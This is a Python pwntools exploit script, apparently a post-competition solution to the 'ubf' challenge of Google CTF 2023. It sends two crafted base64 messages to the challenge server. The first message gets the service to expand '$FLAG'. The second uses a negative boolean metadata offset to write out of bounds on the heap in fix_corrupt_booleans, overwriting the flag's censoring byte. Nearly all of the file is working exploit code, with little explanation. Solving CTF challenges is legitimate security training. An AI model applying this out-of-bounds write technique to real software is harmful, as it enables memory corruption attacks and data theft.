#!/usr/bin/env python3

from pwn import *
import base64

"""
This has been solved after the end of the CTF unfortunately.
"""

#context.log_level = logging.DEBUG
#context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

HOST = 'ubf.2023.ctfcompetition.com'
PORT = '1337'

#r = process('./ubf')
r = remote(HOST, PORT)

# gdb.attach(r, """
# b unpack_bools
# #b *(unpack_strings+ 250) 
# #b  expand_string
# #b unpack_bools
# b fix_corrupt_booleans
# """)


"""
| len (32 bits) | type (32 bits) | ?  |
"""

# Message 1: $CTF string to unpack, to call getenv($FLAG)
string_len = 0x24
d = p16(string_len) + b'$FLAG'.ljust(string_len, b'\x00')

# type
t = p8(ord('s'))

# nb of element
count = 1

# metadata, with constraints in string unpacking 
metadata = p16(2*count)

body = t + p16(count) + metadata + d
message_1 = p32(len(body) + 4) + body


# Message 1: whatever bool value with negative metadata
d = b'\x01'
t = p8(ord('b'))

count = 1

# use payload overwrite in fix_corrupt_booleans
# using the negative value of metadata
# to overwrite of the character of the flag "CTF" part,
# which is before the second message buffer on the heap
# overwrites "C"
target_offset = 0xff92
metadata = p16(target_offset)

body = t + p16(count) + metadata + d

message_2 = p32(len(body) + 4) + body

payload = message_1 + message_2

r.sendlineafter(b'encoded:\n', base64.b64encode(payload))
log.info(r.recvline())